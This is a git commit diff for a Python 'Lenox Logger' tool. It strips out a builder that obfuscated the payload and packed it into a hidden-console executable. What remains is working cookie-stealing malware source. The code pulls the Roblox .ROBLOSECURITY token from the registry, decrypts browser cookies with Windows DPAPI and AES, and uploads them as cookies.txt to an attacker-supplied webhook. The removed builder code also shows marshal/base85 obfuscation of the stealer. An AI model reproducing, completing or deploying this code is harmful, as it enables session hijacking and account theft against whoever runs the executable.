e7ac2245908da4ee02f791c0ce0c88849ba5cfbf
Stileox <113307558+Stileox@users.noreply.github.com>
2023-05-16 11:18:18 +0300

    Lenox Logger

--- main.py
+++ main.py
@@ -1,29 +1,4 @@
-import os
-import base64
-import shutil
-import marshal
-import traceback
-import subprocess
-
-if "Python was not found; run without arguments to install from the Microsoft Store, or disable this shortcut from Settings > Manage App Execution Aliases." in subprocess.check_output("python --version").decode():
-    os.system("powershell Remove-Item $env:LOCALAPPDATA\Microsoft\WindowsApps\python.exe") # Remove the bugged app alias that Microsoft added (Because Microsoft doesn't do anything right)
-    os.system("cls")
-
-if "is not recognized" in subprocess.check_output("python --version").decode():
-    print("Python is not added to PATH! Reinstall Python and make sure to tick the Add Python to PATH box!")
-    while True: pass
-
-os.system("python -m pip install pyinstaller pypiwin32 pycryptodome requests")
-os.system("cls")
-
-webhook = input("Paste your Webhook: ")
-obfuscate = input("Obfuscate (Encrypt) the code? (Y/N): ")
-console = input("Show the Console when running? (Y/N): ")
-
-id = base64.b64encode(os.urandom(16)).decode().replace("=","").replace("/","")
-
-code = f"""
-webhook = "{webhook}" # WEBHOOK HERE
+webhook = "" # WEBHOOK HERE
 
 import os
 import json
@@ -60,7 +35,7 @@ class CookieLogger:
                 pass
 
         try:
-            cookies.append(("Roblox App", ("None", '\\n'.join(line for line in subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip()))))
+            cookies.append(("Roblox App", ("None", '\n'.join(line for line in subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip()))))
         except Exception:
             pass
         
@@ -71,11 +46,11 @@ class CookieLogger:
                 continue
 
             for _cookie in cookie[1]:
-                cookieDoc += f"Browser: {{cookie[0]}}\\nProfile: {{_cookie[0]}}\\nCookie: {{_cookie[1]}}\\n\\n"
-                
-        if not cookieDoc: cookieDoc = "No Cookies Found!"
-        
-        requests.post(webhook, files = {{"cookies.txt": cookieDoc}})
+                cookieDoc += f"Browser: {cookie[0]}\nProfile: {_cookie[0]}\nCookie: {_cookie[1]}\n\n"
+
+                if not cookieDoc: cookieDoc = "No Cookies Found!"
+                        
+        requests.post(webhook, files = {"cookies.txt": cookieDoc})
     
     @safe
     def findBrowsers(self):
@@ -121,10 +96,10 @@ class CookieLogger:
     @safe
     def getCookie(self, browserPath, isProfiled):
 
-        if browserPath.split("\\\\")[-1] == "User Data":
-            browserName = browserPath.split("\\\\")[-2]
+        if browserPath.split("\\")[-1] == "User Data":
+            browserName = browserPath.split("\\")[-2]
         else:
-            browserName = browserPath.split("\\\\")[-1]
+            browserName = browserPath.split("\\")[-1]
         
         cookiesFound = []
 
@@ -186,30 +161,3 @@ class CookieLogger:
 
 if __name__ == "__main__":
     CookieLogger()
-
-"""
-
-try:
-    if obfuscate.lower().startswith("Y"):
-        newcode = f"""
-    import os;import json;import base64;import shutil;import sqlite3;import requests;import subprocess;import marshal;from win32crypt import CryptUnprotectData;from Crypto.Cipher import AES;exec(marshal.loads(base64.b85decode(b"{base64.b85encode(marshal.dumps(compile(code, id, "exec"))).decode()}")))"""
-    else:
-        newcode = code
-
-    open(f"tmp_{id}.py", "w").write(newcode)
-
-    os.system(f"pyinstaller --clean {'--noconsole ' if console.lower().startswith('Y') else ''}--onefile tmp_{id}.py")
-
-    shutil.copy2(f"dist\\tmp_{id}.exe", "output.exe")
-    shutil.rmtree("dist")
-    shutil.rmtree("build")
-    os.remove(f"tmp_{id}.py")
-    os.remove(f"tmp_{id}.spec")
-
-    os.system("cls")
-
-    print("Done!\nYou can rename to file\nTo change the icon, download a .ico file as well as Resource Hacker. Then replace the resource. You can find a tutorial on how to do this on YouTube.")
-    while True: pass
-except Exception:
-    print(traceback.format_exc() + "\n\nAn Error occured! See above, and make an issue on the GitHub repository or contact me if you can't solve it yourself!")
-    while True: pass
